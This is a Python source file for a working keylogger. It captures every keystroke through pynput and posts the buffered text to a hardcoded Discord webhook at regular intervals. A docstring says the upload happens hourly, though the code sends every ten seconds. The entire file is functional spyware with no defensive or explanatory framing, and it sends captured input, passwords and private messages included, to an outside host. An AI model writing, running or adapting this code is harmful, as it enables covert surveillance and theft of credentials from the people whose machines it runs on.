import time
import requests
from pynput import keyboard

# Replace with your Discord webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/1350143720145686569/UcPvfxaryQuULwxeoIZCaPSPP57PiF9O6MDbWcmzpMyM-8PiLtrBaKEibfOmSH0jVrXf'

# Buffer to store keystrokes
key_buffer = []

def send_to_discord(message):
    """Send the message to Discord using the webhook."""
    data = {
        "content": message
    }
    requests.post(WEBHOOK_URL, json=data)

def on_press(key):
    """Callback function that is called whenever a key is pressed."""
    try:
        key_buffer.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            key_buffer.append(' ')
        elif key == keyboard.Key.enter:
            key_buffer.append('\n')
        elif key == keyboard.Key.backspace:
            if key_buffer:
                key_buffer.pop()
        else:
            key_buffer.append(f'[{key}]')

def log_keys():
    """Log the keys and send them to Discord every hour."""
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    while True:
        time.sleep(10)
        if key_buffer:
            logged_keys = ''.join(key_buffer)
            send_to_discord(f"Keylog:\n```\n{logged_keys}\n```")
            key_buffer.clear()
if __name__ == "__main__":
    log_keys()
